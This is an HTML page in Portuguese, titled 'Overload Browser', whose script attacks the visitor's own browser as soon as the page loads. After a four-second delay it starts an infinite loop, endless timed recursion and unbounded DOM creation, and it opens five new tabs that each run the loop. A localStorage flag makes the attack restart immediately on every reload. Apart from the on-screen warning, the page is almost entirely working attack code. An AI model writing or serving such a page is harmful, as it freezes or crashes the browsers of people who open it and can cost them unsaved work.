<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sobrecarregar Navegador</title>
    <style>
        .content {
            margin: 10px;
            padding: 10px;
            border: 1px solid #ccc;
        }
    </style>
    <script>
        // Método 1: Loop infinito
        function overloadWithLoop() {
            while (true) {
                console.log("Sobrecarregando com loop infinito...");
            }
        }

        // Método 2: Função recursiva
        function overloadWithRecursion() {
            setTimeout(function() {
                console.log("Sobrecarregando com recursão...");
                overloadWithRecursion();  // Chama a função novamente para criar recursão infinita
            }, 1);  // Intervalo mínimo para forçar a recursão rápida
        }

        // Método 3: Manipulação excessiva do DOM
        function overloadWithDOM() {
            let i = 0;
            while (true) {
                let newElement = document.createElement('div');
                newElement.classList.add('content');
                newElement.innerHTML = `<h2>Elemento Gerado</h2><p>Elemento ${i++}</p>`;
                document.body.appendChild(newElement);
            }
        }

        // Método 4: Abertura de novas abas
        function openAndOverload() {
            for (let i = 0; i < 5; i++) {
                let newWindow = window.open('', '_blank');
                newWindow.document.write('<!DOCTYPE html><html><head><title>Sobrecarregando</title></head><body><h1>Esta aba está sobrecarregando o navegador.</h1></body></html>');
                newWindow.document.close();
                newWindow.onload = function() {
                    overloadWithLoop();  // Ou qualquer outro método de sobrecarga
                };
            }
        }

        // Método 5: Utilizando intervalos para realizar o processo de sobrecarga em diferentes tempos
        function overloadWithIntervals() {
            let interval = 1000;
            let count = 0;
            let overloadInterval = setInterval(function() {
                console.log(`Sobrecarregando... ${count++}`);
                if (count === 10) {
                    clearInterval(overloadInterval);  // Para a sobrecarga após 10 iterações
                }
            }, interval);
        }

        // Função para iniciar a sobrecarga
        function startOverload() {
            overloadWithLoop();  // Exemplo de uso de loop infinito
            overloadWithRecursion();  // Exemplo de recursão infinita
            overloadWithDOM();  // Exemplo de manipulação excessiva do DOM
            openAndOverload();  // Abre novas abas com sobrecarga
            overloadWithIntervals();  // Exemplo de sobrecarga com intervalos
        }

        // Verifica se a sobrecarga já foi iniciada
        function checkOverloadStatus() {
            if (localStorage.getItem('overloadStarted') === 'true') {
                startOverload();  // Começa a sobrecarga automaticamente
            } else {
                // Inicia a sobrecarga após 4 segundos
                setTimeout(function() {
                    localStorage.setItem('overloadStarted', 'true');  // Marca que a sobrecarga foi iniciada
                    startOverload();  // Inicia a sobrecarga
                }, 4000);  // Atraso de 4 segundos
            }
        }

        // Verifica o status de sobrecarga ao carregar a página
        window.onload = checkOverloadStatus;
    </script>
</head>
<body>
    <h1>Sobrecarregar Navegador</h1>
    <p>O navegador será sobrecarregado em 4 segundos. Aguarde...</p>
</body>
</html>
